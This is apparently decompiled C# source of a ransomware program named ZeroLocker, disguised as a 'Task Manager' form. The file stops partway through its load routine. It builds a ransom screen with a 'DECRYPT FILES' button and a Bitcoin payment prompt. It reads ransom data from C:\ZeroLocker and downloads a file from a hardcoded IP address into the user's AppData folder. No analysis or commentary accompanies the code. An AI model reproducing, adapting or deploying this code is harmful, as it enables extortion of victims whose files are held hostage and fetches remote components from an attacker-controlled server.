using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace TaskManager;

[DesignerGenerated]
public class Form1 : Form
{
	private enum Enum0
	{
		const_0 = 1,
		const_1
	}

	public class Crc32
	{
		private static uint[] uint_0;

		[DebuggerNonUserCode]
		public Crc32()
		{
		}

		static Crc32()
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			int num5 = default(int);
			uint num8 = default(uint);
			uint num9 = default(uint);
			uint num10 = default(uint);
			uint num11 = default(uint);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					checked
					{
						int num6;
						int num7;
						uint num12;
						uint num13;
						switch (try0001_dispatch)
						{
						default:
							ProjectData.ClearProjectError();
							num3 = -2;
							goto IL_0009;
						case 246:
							{
								num2 = num;
								switch ((num3 <= -2) ? 1 : num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
								int num4 = unchecked(num2 + 1);
								num2 = 0;
								switch (num4)
								{
								case 1:
									break;
								case 2:
									goto IL_0009;
								case 3:
									goto IL_0011;
								case 4:
									goto IL_0022;
								case 5:
									goto IL_0026;
								case 6:
									goto IL_0041;
								case 7:
									goto IL_0046;
								case 8:
									goto IL_004b;
								case 11:
									goto IL_0058;
								case 12:
									goto IL_005b;
								case 9:
									goto IL_0064;
								case 15:
									goto IL_006f;
								case 16:
									goto IL_007c;
								case 10:
								case 13:
								case 14:
									goto IL_0087;
								default:
									goto end_IL_0001;
								case 17:
									goto end_IL_0001_2;
								}
								goto default;
							}
							IL_0087:
							num = 14;
							num5 += -1;
							num6 = num5;
							num7 = 1;
							if (num6 >= num7)
							{
								goto IL_004b;
							}
							goto IL_006f;
							IL_006f:
							num = 15;
							uint_0[(int)num8] = num9;
							goto IL_007c;
							IL_0064:
							num = 9;
							num9 = (num9 >> 1) ^ num10;
							goto IL_0087;
							IL_007c:
							num = 16;
							num8++;
							goto IL_0037;
							IL_0009:
							num = 2;
							num10 = 3988292384u;
							goto IL_0011;
							IL_0011:
							num = 3;
							uint_0 = new uint[256];
							goto IL_0022;
							IL_0022:
							num = 4;
							num9 = 0u;
							goto IL_0026;
							IL_0026:
							num = 5;
							num11 = (uint)(uint_0.Length - 1);
							num8 = 0u;
							goto IL_0037;
							IL_0037:
							num12 = num8;
							num13 = num11;
							if (num12 > num13)
							{
								goto end_IL_0001_2;
							}
							goto IL_0041;
							IL_0041:
							num = 6;
							num9 = num8;
							goto IL_0046;
							IL_0046:
							num = 7;
							num5 = 8;
							goto IL_004b;
							IL_004b:
							num = 8;
							if ((unchecked((ulong)num9) & 1uL) != 1)
							{
								goto IL_0058;
							}
							goto IL_0064;
							IL_0058:
							num = 11;
							goto IL_005b;
							IL_005b:
							num = 12;
							num9 >>= 1;
							goto IL_0087;
							end_IL_0001:
							break;
						}
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 246;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_2:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public static uint ComputeChecksum(byte[] bytes)
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			byte b = default(byte);
			uint num5 = default(uint);
			int num6 = default(int);
			int num8 = default(int);
			uint num10 = default(uint);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					checked
					{
						int num7;
						int num9;
						switch (try0001_dispatch)
						{
						default:
							ProjectData.ClearProjectError();
							num3 = -2;
							goto IL_000a;
						case 139:
							{
								num2 = num;
								switch ((num3 <= -2) ? 1 : num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
								int num4 = unchecked(num2 + 1);
								num2 = 0;
								switch (num4)
								{
								case 1:
									break;
								case 2:
									goto IL_000a;
								case 3:
									goto IL_000f;
								case 4:
									goto IL_001d;
								case 5:
									goto IL_0030;
								case 6:
									goto IL_003f;
								case 7:
									goto end_IL_0001_2;
								default:
									goto end_IL_0001;
								case 8:
									goto end_IL_0001_3;
								}
								goto default;
							}
							IL_001d:
							num = 4;
							b = (byte)((unchecked((long)num5) & 0xFFL) ^ bytes[num6]);
							goto IL_0030;
							IL_0030:
							num = 5;
							num5 = (num5 >> 8) ^ uint_0[b];
							goto IL_003f;
							IL_0046:
							num7 = num6;
							num9 = num8;
							if (num7 > num9)
							{
								break;
							}
							goto IL_001d;
							IL_003f:
							num = 6;
							num6++;
							goto IL_0046;
							IL_000a:
							num = 2;
							num5 = uint.MaxValue;
							goto IL_000f;
							IL_000f:
							num = 3;
							num8 = bytes.Length - 1;
							num6 = 0;
							goto IL_0046;
							end_IL_0001_2:
							break;
						}
						num = 7;
						num10 = ~num5;
						break;
					}
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 139;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			uint result = num10;
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public static uint ComputeChecksum(string Str)
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			byte b = default(byte);
			uint num5 = default(uint);
			byte[] bytes = default(byte[]);
			int num6 = default(int);
			int num8 = default(int);
			uint num10 = default(uint);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					checked
					{
						int num7;
						int num9;
						switch (try0001_dispatch)
						{
						default:
							ProjectData.ClearProjectError();
							num3 = -2;
							goto IL_000a;
						case 166:
							{
								num2 = num;
								switch ((num3 <= -2) ? 1 : num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
								int num4 = unchecked(num2 + 1);
								num2 = 0;
								switch (num4)
								{
								case 1:
									break;
								case 2:
									goto IL_000a;
								case 3:
									goto IL_0019;
								case 4:
									goto IL_001e;
								case 5:
									goto IL_002c;
								case 6:
									goto IL_0040;
								case 7:
									goto IL_0050;
								case 8:
									goto end_IL_0001_2;
								default:
									goto end_IL_0001;
								case 9:
									goto end_IL_0001_3;
								}
								goto default;
							}
							IL_002c:
							num = 5;
							b = (byte)((unchecked((long)num5) & 0xFFL) ^ bytes[num6]);
							goto IL_0040;
							IL_0040:
							num = 6;
							num5 = (num5 >> 8) ^ uint_0[b];
							goto IL_0050;
							IL_0057:
							num7 = num6;
							num9 = num8;
							if (num7 > num9)
							{
								break;
							}
							goto IL_002c;
							IL_0050:
							num = 7;
							num6++;
							goto IL_0057;
							IL_000a:
							num = 2;
							bytes = Encoding.UTF8.GetBytes(Str);
							goto IL_0019;
							IL_0019:
							num = 3;
							num5 = uint.MaxValue;
							goto IL_001e;
							IL_001e:
							num = 4;
							num8 = bytes.Length - 1;
							num6 = 0;
							goto IL_0057;
							end_IL_0001_2:
							break;
						}
						num = 8;
						num10 = ~num5;
						break;
					}
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 166;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			uint result = num10;
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("Button1")]
	private Button button_0;

	[AccessedThroughProperty("Button2")]
	private Button button_1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("Label1")]
	private Label label_0;

	[AccessedThroughProperty("TextBox2")]
	private TextBox textBox_1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_1;

	[AccessedThroughProperty("TextBox3")]
	private TextBox textBox_2;

	[AccessedThroughProperty("TextBox4")]
	private TextBox textBox_3;

	[AccessedThroughProperty("TextBox5")]
	private TextBox textBox_4;

	[AccessedThroughProperty("TextBox6")]
	private TextBox textBox_5;

	[AccessedThroughProperty("TextBox7")]
	private TextBox textBox_6;

	private string string_0;

	private string string_1;

	private FileStream fileStream_0;

	private FileStream fileStream_1;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e0: Expected O, but got Unknown
		//IL_0255: Unknown result type (might be due to invalid IL or missing references)
		//IL_025f: Expected O, but got Unknown
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0385: Expected O, but got Unknown
		//IL_0415: Unknown result type (might be due to invalid IL or missing references)
		//IL_041f: Expected O, but got Unknown
		//IL_04b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c1: Expected O, but got Unknown
		//IL_0580: Unknown result type (might be due to invalid IL or missing references)
		//IL_058a: Expected O, but got Unknown
		//IL_063b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0645: Expected O, but got Unknown
		//IL_06f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0700: Expected O, but got Unknown
		//IL_07bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c5: Expected O, but got Unknown
		//IL_096f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0979: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		vmethod_1(new Button());
		vmethod_3(new Button());
		vmethod_5(new PictureBox());
		vmethod_7(new TextBox());
		vmethod_9(new Label());
		vmethod_11(new TextBox());
		vmethod_13(new PictureBox());
		vmethod_15(new TextBox());
		vmethod_17(new TextBox());
		vmethod_19(new TextBox());
		vmethod_21(new TextBox());
		vmethod_23(new TextBox());
		((ISupportInitialize)vmethod_4()).BeginInit();
		((ISupportInitialize)vmethod_12()).BeginInit();
		((Control)this).SuspendLayout();
		((ButtonBase)vmethod_0()).set_BackColor(Color.PaleGreen);
		((Control)vmethod_0()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Button obj = vmethod_0();
		Point location = new Point(692, 487);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("Button1");
		Button obj2 = vmethod_0();
		Size size = new Size(75, 69);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(1);
		((ButtonBase)vmethod_0()).set_Text("DECRYPT FILES");
		((ButtonBase)vmethod_0()).set_UseVisualStyleBackColor(false);
		((ButtonBase)vmethod_2()).set_BackColor(Color.Gainsboro);
		Button obj3 = vmethod_2();
		location = new Point(692, 574);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("Button2");
		Button obj4 = vmethod_2();
		size = new Size(75, 23);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(2);
		((ButtonBase)vmethod_2()).set_Text("EXIT");
		((ButtonBase)vmethod_2()).set_UseVisualStyleBackColor(false);
		vmethod_4().set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox obj5 = vmethod_4();
		location = new Point(19, 21);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("PictureBox1");
		PictureBox obj6 = vmethod_4();
		size = new Size(107, 102);
		((Control)obj6).set_Size(size);
		vmethod_4().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_4().set_TabIndex(6);
		vmethod_4().set_TabStop(false);
		((Control)vmethod_6()).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj7 = vmethod_6();
		location = new Point(232, 535);
		((Control)obj7).set_Location(location);
		((Control)vmethod_6()).set_Name("TextBox1");
		TextBox obj8 = vmethod_6();
		size = new Size(418, 29);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(8);
		vmethod_8().set_AutoSize(true);
		((Control)vmethod_8()).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)vmethod_8()).set_ForeColor(Color.Red);
		Label obj9 = vmethod_8();
		location = new Point(138, 21);
		((Control)obj9).set_Location(location);
		((Control)vmethod_8()).set_Name("Label1");
		Label obj10 = vmethod_8();
		size = new Size(486, 37);
		((Control)obj10).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(9);
		vmethod_8().set_Text("IMPORTANT!  PLEASE READ!");
		((TextBoxBase)vmethod_10()).set_BackColor(Color.White);
		((TextBoxBase)vmethod_10()).set_BorderStyle((BorderStyle)0);
		((Control)vmethod_10()).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TextBox obj11 = vmethod_10();
		location = new Point(145, 61);
		((Control)obj11).set_Location(location);
		vmethod_10().set_Multiline(true);
		((Control)vmethod_10()).set_Name("TextBox2");
		((TextBoxBase)vmethod_10()).set_ReadOnly(true);
		TextBox obj12 = vmethod_10();
		size = new Size(621, 69);
		((Control)obj12).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(10);
		vmethod_10().set_Text(componentResourceManager.GetString("TextBox2.Text"));
		vmethod_12().set_Image((Image)componentResourceManager.GetObject("PictureBox2.Image"));
		PictureBox obj13 = vmethod_12();
		location = new Point(44, 518);
		((Control)obj13).set_Location(location);
		((Control)vmethod_12()).set_Name("PictureBox2");
		PictureBox obj14 = vmethod_12();
		size = new Size(159, 61);
		((Control)obj14).set_Size(size);
		vmethod_12().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_12().set_TabIndex(11);
		vmethod_12().set_TabStop(false);
		((TextBoxBase)vmethod_14()).set_BackColor(Color.White);
		((TextBoxBase)vmethod_14()).set_BorderStyle((BorderStyle)0);
		((Control)vmethod_14()).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)vmethod_14()).set_ForeColor(Color.FromArgb(0, 0, 192));
		TextBox obj15 = vmethod_14();
		location = new Point(24, 132);
		((Control)obj15).set_Location(location);
		vmethod_14().set_Multiline(true);
		((Control)vmethod_14()).set_Name("TextBox3");
		((TextBoxBase)vmethod_14()).set_ReadOnly(true);
		TextBox obj16 = vmethod_14();
		size = new Size(743, 55);
		((Control)obj16).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(12);
		vmethod_14().set_Text("The good news is that your files are not lost forever!  This tool is able to rescue the files on your computer for you!");
		((TextBoxBase)vmethod_16()).set_BackColor(Color.White);
		((TextBoxBase)vmethod_16()).set_BorderStyle((BorderStyle)0);
		((Control)vmethod_16()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj17 = vmethod_16();
		location = new Point(24, 352);
		((Control)obj17).set_Location(location);
		vmethod_16().set_Multiline(true);
		((Control)vmethod_16()).set_Name("TextBox4");
		((TextBoxBase)vmethod_16()).set_ReadOnly(true);
		TextBox obj18 = vmethod_16();
		size = new Size(743, 160);
		((Control)obj18).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(13);
		vmethod_16().set_Text(componentResourceManager.GetString("TextBox4.Text"));
		((TextBoxBase)vmethod_18()).set_BackColor(Color.White);
		((TextBoxBase)vmethod_18()).set_BorderStyle((BorderStyle)0);
		((Control)vmethod_18()).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TextBox obj19 = vmethod_18();
		location = new Point(23, 193);
		((Control)obj19).set_Location(location);
		vmethod_18().set_Multiline(true);
		((Control)vmethod_18()).set_Name("TextBox5");
		((TextBoxBase)vmethod_18()).set_ReadOnly(true);
		TextBox obj20 = vmethod_18();
		size = new Size(743, 153);
		((Control)obj20).set_Size(size);
		((Control)vmethod_18()).set_TabIndex(14);
		vmethod_18().set_Text(componentResourceManager.GetString("TextBox5.Text"));
		((TextBoxBase)vmethod_20()).set_BackColor(Color.White);
		((TextBoxBase)vmethod_20()).set_BorderStyle((BorderStyle)0);
		((Control)vmethod_20()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)vmethod_20()).set_ForeColor(SystemColors.MenuHighlight);
		TextBox obj21 = vmethod_20();
		location = new Point(232, 513);
		((Control)obj21).set_Location(location);
		vmethod_20().set_Multiline(true);
		((Control)vmethod_20()).set_Name("TextBox6");
		((TextBoxBase)vmethod_20()).set_ReadOnly(true);
		TextBox obj22 = vmethod_20();
		size = new Size(317, 23);
		((Control)obj22).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(15);
		vmethod_20().set_Text("SEND BITCOIN PAYMENT TO THIS ADDRESS:");
		((TextBoxBase)vmethod_22()).set_BackColor(Color.White);
		((TextBoxBase)vmethod_22()).set_BorderStyle((BorderStyle)0);
		((Control)vmethod_22()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)vmethod_22()).set_ForeColor(Color.Black);
		TextBox obj23 = vmethod_22();
		location = new Point(24, 596);
		((Control)obj23).set_Location(location);
		vmethod_22().set_Multiline(true);
		((Control)vmethod_22()).set_Name("TextBox7");
		((TextBoxBase)vmethod_22()).set_ReadOnly(true);
		TextBox obj24 = vmethod_22();
		size = new Size(639, 23);
		((Control)obj24).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(16);
		vmethod_22().set_Text("*Please note that early bird qualification is determined from the date that this tool was first run as recorded on our servers.");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoScroll(true);
		((Form)this).set_BackColor(Color.White);
		size = new Size(799, 622);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_18());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Task Manager");
		((ISupportInitialize)vmethod_4()).EndInit();
		((ISupportInitialize)vmethod_12()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Button vmethod_0()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(Button button_2)
	{
		EventHandler eventHandler = method_3;
		if (button_0 != null)
		{
			((Control)button_0).remove_Click(eventHandler);
		}
		button_0 = button_2;
		if (button_0 != null)
		{
			((Control)button_0).add_Click(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Button vmethod_2()
	{
		return button_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(Button button_2)
	{
		EventHandler eventHandler = method_4;
		if (button_1 != null)
		{
			((Control)button_1).remove_Click(eventHandler);
		}
		button_1 = button_2;
		if (button_1 != null)
		{
			((Control)button_1).add_Click(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual PictureBox vmethod_4()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_5(PictureBox pictureBox_2)
	{
		pictureBox_0 = pictureBox_2;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_6()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_7(TextBox textBox_7)
	{
		textBox_0 = textBox_7;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_8()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_9(Label label_1)
	{
		label_0 = label_1;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_10()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_11(TextBox textBox_7)
	{
		textBox_1 = textBox_7;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual PictureBox vmethod_12()
	{
		return pictureBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_13(PictureBox pictureBox_2)
	{
		pictureBox_1 = pictureBox_2;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_14()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_15(TextBox textBox_7)
	{
		textBox_2 = textBox_7;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_16()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_17(TextBox textBox_7)
	{
		textBox_3 = textBox_7;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_18()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_19(TextBox textBox_7)
	{
		textBox_4 = textBox_7;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_20()
	{
		return textBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_21(TextBox textBox_7)
	{
		textBox_5 = textBox_7;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_22()
	{
		return textBox_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_23(TextBox textBox_7)
	{
		textBox_6 = textBox_7;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string fileName = default(string);
		WebClient webClient = default(WebClient);
		string address = default(string);
		TextReader textReader = default(TextReader);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string address2 = default(string);
		string fileName2 = default(string);
		WebClient webClient2 = default(WebClient);
		string path = default(string);
		string address3 = default(string);
		string fileName3 = default(string);
		WebClient webClient3 = default(WebClient);
		Process process = default(Process);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 880:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_002d;
						case 6:
							goto IL_003a;
						case 7:
							goto IL_0043;
						case 8:
							goto IL_006c;
						case 9:
							goto IL_0080;
						case 10:
							goto IL_00a1;
						case 13:
							goto IL_00b0;
						case 14:
							goto IL_00b3;
						case 15:
							goto IL_00bd;
						case 16:
							goto IL_00de;
						case 17:
							goto IL_00e9;
						case 18:
							goto IL_00f9;
						case 19:
							goto IL_0109;
						case 20:
							goto IL_014a;
						case 21:
							goto IL_0154;
						case 22:
							goto IL_015e;
						case 23:
							goto IL_016c;
						case 24:
							goto IL_0176;
						case 25:
							goto IL_0184;
						case 26:
							goto IL_018e;
						case 27:
							goto IL_0198;
						case 28:
							goto IL_01a2;
						case 29:
							goto IL_01b0;
						case 30:
							goto IL_01ba;
						case 31:
							goto IL_01c4;
						case 32:
							goto IL_01d4;
						case 33:
							goto IL_01e3;
						case 34:
							goto IL_01f2;
						case 35:
							goto IL_01fd;
						case 36:
							goto IL_0208;
						case 37:
							goto IL_0213;
						case 38:
							goto IL_021f;
						case 39:
							goto IL_022a;
						case 40:
							goto IL_023a;
						case 41:
							goto IL_0244;
						case 42:
							goto IL_024e;
						case 43:
							goto IL_0258;
						case 44:
							goto IL_026e;
						case 45:
							goto IL_0278;
						case 46:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 11:
						case 12:
						case 47:
						case 48:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0258:
					num = 43;
					fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.001";
					goto IL_026e;
					IL_026e:
					num = 44;
					webClient = new WebClient();
					goto IL_0278;
					IL_024e:
					num = 42;
					address = "http://5.199.171.47/ciph/1";
					goto IL_0258;
					IL_0278:
					num = 45;
					webClient.DownloadFile(address, fileName);
					break;
					IL_0009:
					num = 2;
					Thread.Sleep(20000);
					goto IL_0015;
					IL_0015:
					num = 3;
					Application.DoEvents();
					goto IL_001c;
					IL_001c:
					num = 4;
					if (File.Exists("C:\\ZeroLocker\\log.dat"))
					{
						goto IL_002d;
					}
					goto IL_00b0;
					IL_002d:
					num = 5;
					textReader = new StreamReader("C:\\ZeroLocker\\address.dat");
					goto IL_003a;
					IL_003a:
					num = 6;
					text = textReader.ReadToEnd();
					goto IL_0043;
					IL_0043:
					num = 7;
					text2 = Strings.Replace(Strings.Replace(text, "\n", "", 1, -1, (CompareMethod)0), "\r", "", 1, -1, (CompareMethod)0);
					goto IL_006c;
					IL_006c:
					num = 8;
					vmethod_6().set_Text(text2.ToString());
					goto IL_0080;
					IL_0080:
					num = 9;
